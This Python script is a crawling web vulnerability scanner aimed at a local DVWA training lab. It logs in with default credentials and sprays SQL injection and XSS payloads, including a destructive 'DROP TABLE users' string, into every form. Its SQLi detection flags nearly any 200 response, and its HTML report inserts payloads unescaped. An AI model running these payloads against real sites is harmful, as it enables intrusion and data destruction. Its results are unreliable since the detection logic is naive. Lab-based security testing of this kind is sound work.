import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from collections import deque
import json
import time

# -----------------------------
# Config
# -----------------------------
BASE_URL = "http://localhost"
LOGIN_URL = BASE_URL + "/login.php"
USERNAME = "admin"
PASSWORD = "password"
REPORT_FILE = "auto_vuln_dashboard.html"

# -----------------------------
# Session with auto-login
# -----------------------------
session = requests.Session()

def login():
    """Perform login and update session cookies."""
    response = session.get(LOGIN_URL)
    soup = BeautifulSoup(response.text, "html.parser")
    user_token = soup.find("input", {"name": "user_token"})["value"]
    login_data = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": user_token
    }
    session.post(LOGIN_URL, data=login_data)
    print("[+] Logged in successfully!")

def request_with_auto_login(url, method="get", data=None, retries=1):
    """Request page with automatic login refresh if session expired."""
    for _ in range(retries + 1):
        if method == "get":
            response = session.get(url)
        else:
            response = session.post(url, data=data)
        if "login" in response.url.lower() or "Login" in response.text:
            print("[*] Session expired, re-logging in...")
            login()
            time.sleep(1)  # wait a bit after login
            continue
        return response
    return response

# -----------------------------
# Form utilities
# -----------------------------
def get_forms(url):
    soup = BeautifulSoup(request_with_auto_login(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, page_url, payload):
    target = urljoin(page_url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["name"]:
            data[input["name"]] = payload
    if form_details["method"] == "post":
        return request_with_auto_login(target, method="post", data=data)
    else:
        return request_with_auto_login(target, method="get", data=data)

# -----------------------------
# Payloads
# -----------------------------
SQLI_PAYLOADS = ["' OR '1'='1", "' OR 'a'='a", "' OR 1=1 --", "'; DROP TABLE users; --"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>"]

def check_sqli(url):
    results = []
    for form in get_forms(url):
        details = get_form_details(form)
        for payload in SQLI_PAYLOADS:
            response = submit_form(details, url, payload)
            if "error" not in response.text.lower() and response.status_code == 200:
                results.append(payload)
    return results

def check_xss(url):
    results = []
    for form in get_forms(url):
        details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            response = submit_form(details, url, payload)
            if payload in response.text:
                results.append(payload)
    return results

def check_headers(url):
    headers_to_check = ["Content-Security-Policy","X-Frame-Options","X-Content-Type-Options","Strict-Transport-Security"]
    response = request_with_auto_login(url)
    return [h for h in headers_to_check if h not in response.headers]

# -----------------------------
# Auto-crawl site
# -----------------------------
def crawl_site(start_url):
    visited = set()
    queue = deque([start_url])
    results = {}
    while queue:
        url = queue.popleft()
        if url in visited:
            continue
        visited.add(url)
        print(f"[*] Scanning page: {url}")
        sqli = check_sqli(url)
        xss = check_xss(url)
        headers_missing = check_headers(url)
        results[url] = {
            "SQLi": sqli,
            "XSS": xss,
            "MissingHeaders": headers_missing
        }
        # follow links
        try:
            soup = BeautifulSoup(request_with_auto_login(url).content, "html.parser")
            for link in soup.find_all("a", href=True):
                href = urljoin(url, link["href"])
                if href.startswith(BASE_URL) and href not in visited:
                    queue.append(href)
        except:
            continue
    return results

# -----------------------------
# Generate dashboard
# -----------------------------
def generate_dashboard(results):
    data_json = json.dumps([
        {
            "URL": url,
            "SQLi": len(results[url]["SQLi"]),
            "XSS": len(results[url]["XSS"]),
            "MissingHeaders": len(results[url]["MissingHeaders"]),
            "SQLiPayloads": results[url]["SQLi"],
            "XSSPayloads": results[url]["XSS"],
            "MissingHeadersList": results[url]["MissingHeaders"],
            "RiskScore": len(results[url]["SQLi"])*3 + len(results[url]["XSS"])*2 + len(results[url]["MissingHeaders"])*1
        } for url in results
    ])

    html = f"""
    <html>
    <head>
        <title>Auto DVWA Dashboard</title>
        <link rel="stylesheet" href="https://cdn.datatables.net/1.13.6/css/jquery.dataTables.min.css">
        <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
        <script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
        <style>
            body {{ font-family: Arial; margin: 20px; }}
            .collapsible {{ cursor:pointer; color:blue; text-decoration:underline; }}
            .details {{ display:none; margin-left:20px; }}
        </style>
    </head>
    <body>
        <h1>Auto DVWA Vulnerability Dashboard</h1>
        <canvas id="vulnChart" width="800" height="400"></canvas>
        <h2>Vulnerabilities Table</h2>
        <button id="exportCSV">Export Filtered CSV</button>
        <table id="vulnTable" class="display">
            <thead>
                <tr>
                    <th>URL</th>
                    <th>SQLi</th>
                    <th>XSS</th>
                    <th>Missing Headers</th>
                    <th>Risk Score</th>
                </tr>
            </thead>
            <tbody></tbody>
        </table>
        <script>
            const results = {data_json};

            results.forEach(r => {{
                $('#vulnTable tbody').append(
                    `<tr>
                        <td><span class="collapsible">${{r.URL}}</span>
                            <div class="details">
                                <strong>SQLi Payloads:</strong> ${{r.SQLiPayloads.join(', ') || 'None'}}<br>
                                <strong>XSS Payloads:</strong> ${{r.XSSPayloads.join(', ') || 'None'}}<br>
                                <strong>Missing Headers:</strong> ${{r.MissingHeadersList.join(', ') || 'None'}}
                            </div>
                        </td>
                        <td>${{r.SQLi}}</td>
                        <td>${{r.XSS}}</td>
                        <td>${{r.MissingHeaders}}</td>
                        <td>${{r.RiskScore}}</td>
                    </tr>`
                );
            }});

            const table = $('#vulnTable').DataTable();

            $('.collapsible').click(function() {{
                $(this).next('.details').toggle();
            }});

            const ctx = document.getElementById('vulnChart').getContext('2d');
            new Chart(ctx, {{
                type:'bar',
                data:{{
                    labels: results.map(r=>r.URL),
                    datasets:[{{
                        label:'Risk Score',
                        data: results.map(r=>r.RiskScore),
                        backgroundColor: results.map(r =>
                            r.RiskScore >= 5 ? 'rgba(255,0,0,0.6)' :
                            r.RiskScore >= 3 ? 'rgba(255,165,0,0.6)' :
                            'rgba(255,255,0,0.6)'
                        )
                    }}]
                }},
                options: {{ indexAxis:'y', responsive:true, plugins:{{legend:{{display:false}}}} }}
            }});

            $('#exportCSV').click(function(){{
                let csv = 'URL,SQLi,XSS,MissingHeaders,RiskScore\\n';
                table.rows({{search:'applied'}}).every(function(){{
                    let d = this.data();
                    csv += `${{d[0]}},${{d[1]}},${{d[2]}},${{d[3]}},${{d[4]}}\\n`;
                }});
                let blob = new Blob([csv], {{type:'text/csv'}});
                let url = URL.createObjectURL(blob);
                let a = document.createElement('a');
                a.href = url;
                a.download = 'vulnerabilities.csv';
                a.click();
            }});
        </script>
    </body>
    </html>
    """

    with open(REPORT_FILE, "w") as f:
        f.write(html)
    print(f"[+] Auto dashboard saved as {REPORT_FILE}")

# -----------------------------
# Main
# -----------------------------
if __name__ == "__main__":
    login()
    results = crawl_site(BASE_URL)
    generate_dashboard(results)
